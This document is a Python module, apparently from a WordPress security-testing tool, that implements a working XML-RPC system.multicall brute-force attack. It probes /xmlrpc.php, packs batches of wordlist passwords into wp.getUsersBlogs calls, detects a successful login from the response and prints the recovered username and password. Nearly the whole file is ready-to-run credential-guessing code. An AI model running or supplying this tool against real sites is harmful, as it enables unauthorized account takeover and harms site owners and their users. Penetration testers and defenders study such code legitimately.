"""attacks/xmlrpc.py — WordPress XML-RPC multicall brute-force."""
from __future__ import annotations
import logging, sys, time
from pathlib import Path
from xml.etree import ElementTree as ET
from ..base import WordPressTesterBase, Credential

log = logging.getLogger(__name__)
XMLRPC_PATH = "/xmlrpc.php"


def _bar(tested: int, batch_num: int, username: str) -> None:
    """Overwrite current line with a rolling progress indicator."""
    filled = min(batch_num % 20, 20)
    bar    = "█" * filled + "░" * (20 - filled)
    line   = (f"\r  [XMLRPC] user={username}  batch={batch_num:>4}  "
              f"tested≈{tested:>6}  [{bar}]  no match yet   ")
    sys.stdout.write(line)
    sys.stdout.flush()


def _build_multicall(username: str, passwords: list[str]) -> bytes:
    root   = ET.Element("methodCall")
    ET.SubElement(root, "methodName").text = "system.multicall"
    params = ET.SubElement(root, "params")
    param  = ET.SubElement(params, "param")
    outer  = ET.SubElement(param, "value")
    array  = ET.SubElement(outer, "array")
    data   = ET.SubElement(array, "data")
    for pwd in passwords:
        cv     = ET.SubElement(data,  "value")
        struct = ET.SubElement(cv,    "struct")
        m1     = ET.SubElement(struct, "member")
        ET.SubElement(m1, "name").text  = "methodName"
        ET.SubElement(m1, "value").text = "wp.getUsersBlogs"
        m2     = ET.SubElement(struct, "member")
        ET.SubElement(m2, "name").text  = "params"
        pv     = ET.SubElement(m2,  "value")
        pa     = ET.SubElement(pv,  "array")
        pd     = ET.SubElement(pa,  "data")
        ET.SubElement(pd, "value").text = username
        ET.SubElement(pd, "value").text = pwd
    return ET.tostring(root, encoding="unicode").encode("utf-8")


def _parse_success(xml_text: str, passwords: list[str]) -> str | None:
    try:
        root = ET.fromstring(xml_text)
    except ET.ParseError:
        return None
    if root.find(".//fault") is not None:
        return None
    values = root.findall(".//params/param/value/array/data/value")
    for i, val in enumerate(values):
        if i >= len(passwords):
            break
        if val.find(".//fault") is not None:
            continue
        if val.find(".//name[.='blogid']") is not None:
            return passwords[i]
    return None


def _stream_batches(path: Path, size: int):
    batch = []
    with path.open(errors="ignore") as fh:
        for raw in fh:
            w = raw.strip()
            if not w or w.startswith("#"):
                continue
            batch.append(w)
            if len(batch) >= size:
                yield batch
                batch = []
    if batch:
        yield batch


class XMLRPCAttack(WordPressTesterBase):
    """Brute-force via XML-RPC system.multicall batching."""

    def run(self) -> list[Credential]:
        if not self.usernames:
            log.warning("[XMLRPC] No usernames"); return []
        url   = f"{self.target}{XMLRPC_PATH}"
        probe = self._request(
            "POST", url, jitter=False,
            data=b'<?xml version="1.0"?><methodCall>'
                 b'<methodName>system.listMethods</methodName><params/></methodCall>',
            extra_headers={"Content-Type": "text/xml"},
        )
        if not (probe and probe.status_code == 200 and "<array>" in probe.text):
            log.error("[XMLRPC] Endpoint unavailable or disabled"); return []
        print("[XMLRPC] Endpoint confirmed \u2705  starting attack...\n")
        for username in self.usernames:
            cred = self.attack(username, url)
            if cred and self.config.get("stop_on_first", True):
                break
        return self.found_credentials

    def attack(self, username: str, url: str | None = None) -> Credential | None:
        if not self.wordlist:
            log.error("[XMLRPC] No wordlist"); return None
        url        = url or f"{self.target}{XMLRPC_PATH}"
        wl         = Path(self.wordlist)
        batch_size = int(self.config.get("batch", 50))
        headers    = {"Content-Type": "text/xml; charset=utf-8"}
        if not wl.is_file():
            raise FileNotFoundError(wl)

        print(f"[XMLRPC] Attacking '{username}'  batch_size={batch_size}")

        batch_num = 0
        tested    = 0

        for batch in _stream_batches(wl, batch_size):
            batch_num += 1
            tested    += len(batch)

            payload = _build_multicall(username, batch)
            resp    = self._request("POST", url, data=payload,
                                    extra_headers=headers, jitter=False)

            if resp and resp.status_code == 200:
                pwd = _parse_success(resp.text, batch)
                if pwd:
                    sys.stdout.write("\r" + " " * 80 + "\r")
                    sys.stdout.flush()
                    print(f"\n  [!!!] SUCCESS  {username}:{pwd}\n")
                    return self._add_credential(username, pwd, note="xmlrpc")

            _bar(tested, batch_num, username)
            time.sleep(self.delay)

        sys.stdout.write("\r" + " " * 80 + "\r")
        sys.stdout.flush()
        print(f"  [XMLRPC] '{username}' — wordlist exhausted ({tested} passwords tested), no match.")
        return None
